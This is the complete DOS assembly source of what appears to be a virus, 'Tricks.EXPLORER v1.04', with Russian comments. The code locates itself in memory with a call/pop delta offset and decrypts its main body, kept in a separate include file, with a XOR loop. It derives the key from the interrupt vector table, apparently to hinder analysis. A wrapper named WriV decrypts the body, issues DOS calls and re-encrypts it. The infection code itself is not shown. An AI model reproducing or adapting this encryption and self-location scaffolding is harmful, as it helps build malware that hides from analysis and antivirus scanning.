;************************************************
;*	Ticks.EXPLORER v1.04                    *
;************************************************
.286
TestS	segment
	assume	cs:TestS,ds:TestS,ss:TestS
	org	100h
;
Shift	= ((Next-Start)+100h)	
CryptLen= CopyRT-Crypted
;
Start:
	call	Next
Next:
	pop	si
	sub	si,Shift
	call	Crypt	
;
Crypted:
;************************************************
	include	trexp.inc ; Зашифровано         *
;************************************************
CopyRT	db	0,'[Tricks.EXPLORER] v1.04',0
;
WriV:
	call	Crypt
	int	21h
	call	Crypt
	ret
;************************************************
;*	Расшифровщик                            * 
;************************************************
Crypt:
	pusha
; Извлекаем из таблицы векторов константу 59h	
	push	ds
	xor	ax, ax
	mov	ds, ax
	mov	al, byte ptr ds:[100h]
	pop	ds
; Генерируем 55h
	sub	al, (59h-55h)
;
	lea	bx, Crypted[si]
	mov	cx, CryptLen
Circle:	
	xor	byte ptr [bx], al
	inc	bx
	loop	Circle
	popa
	ret
;
Finish:
;
Tests	ends
	End	Start
